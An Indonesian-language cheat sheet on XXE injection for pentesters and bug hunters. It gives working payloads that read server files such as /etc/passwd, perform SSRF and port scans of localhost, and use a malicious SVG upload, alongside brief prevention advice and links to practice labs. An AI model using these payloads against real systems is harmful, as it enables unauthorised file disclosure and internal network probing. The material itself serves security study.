# XXE :kiss:

## Detection
- Yang umum
  - XML file upload
  - XML input field
  - XML based API's (SOAP)
  - XML based files (RSS, SVG)
- Tidak Umum
  - MS Office files (docs, xlsx, etc.)
  - SAML-based SSO
  - VoiceXML in IVR systems
  - Online Map Editors using KML
- XML tag injection
  ```
  ' '' < > &
  ```
 
  
## Exploitation
  - Retrieve Files. Inject [payload](https://github.com/payloadbox/xxe-injection-payload-list) ke bagian `!DOCTYPE`
    ```
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
    ```
  - Exploiting to perform Server Side Request Forgery (SSRF). Sama seperti cara di atas tapi protokol yang digunakan adalah `http` dilanjutkan dengan ip server target
    ```
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://XXX.XXX.XXX.XXX”> ]>
    ```
  - Gunakan `XInclude` jika tidak bisa memodifikasi `!DOCTYPE`. Harap baca SOAP dan XML namespace untuk pemahaman lebih lanjut. 
    ```
    <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```
  - Exploiting via file upload. Caranya adalah dengan membuat file SVG yang mengandung exploit xxe
    ```
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ```
  - *Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses*. Sangat manjur jika menggunakan Burp Collaborator.
  

  - Modifikasi `content-type` pada POST request header.  Ketika respons adalah `200 OK` dan menghasilkan nilai yang sama, maka kita bisa menyelipkan payload pada requesnya
      ```
      POST /action HTTP/1.0
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 7
      foo=bar
      ```
    dimodif dong
      ```    
      POST /action HTTP/1.0
      Content-Type: text/xml
      Content-Length: 52
      <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
      ```
  - Test local machine port (gunakan burp intruder). Brute port dari ip local, lalu cek bergantian `http` dan `https`
    ```
    <!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">
    <!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">
    ```
  - Exploiting [RSS validator](https://taind.wordpress.com/2017/12/25/root-me-xml-external-entity/). jika tidak punya server sendiri untuk upload file XML, gunakan [filebin](https://filebin.net/)

## Prevention
  - Disable DTD
  - Disable entity saja
  - Dissable XInclude
  
## Tips and Trics
  - Cara cepat menemukan XML endpoint adalah automasi
  - Gunakan Burp Collaborator untuk detect blind XXE atau, gunakan remote server untuk mendeteksi blind XEE
  - [xxeserve](https://github.com/joernchen/xxeserve), burpcollaborator alternatif
  - Gunakan webrick sebagai simple server
  - Cari API endpoint
  - Umumnya web request xml menggunakan `Content-Type: application/x-www-form-urlencoded`, modifikasi menjadi `text/xml` atau `application/xml`lalu analisa responnya

## Lab
  - [Portswigger Web Security Academy - XXE injection](https://portswigger.net/web-security/xxe)
  - [Vulnhub - XXE Lab: 1](https://www.vulnhub.com/entry/xxe-lab-1,254/)
  - [Play XML Entities](https://pentesterlab.com/exercises/play_xxe/course)

## Online Resource
  - [Blind XXE - Hunting in the Dark](https://blog.zsec.uk/blind-xxe-learning/)
  - [XML External Entities ft. JohnHammond](https://www.youtube.com/watch?v=gjm6VHZa_8s&t=497s)
  - [From blind XXE to root-level file read access](https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/)
  - [How we got read access on Google’s production servers](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
  - [Identifying Xml eXternal Entity vulnerability (XXE)](https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html)
  - [List of XML markup languages](https://en.wikipedia.org/wiki/List_of_XML_markup_languages)
  - [Finding and Exploiting XXE – XML External Entities Injection](https://resources.infosecinstitute.com/finding-and-exploiting-xxe-xml-external-entities-injection/#gref)
  - [Generic XXE Detection](https://christian-schneider.net/GenericXxeDetection.html)
  - [Advice From A Researcher: Hunting XXE For Fun and Profit](https://www.bugcrowd.com/blog/advice-from-a-bug-hunter-xxe/)
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) - XXE Injection

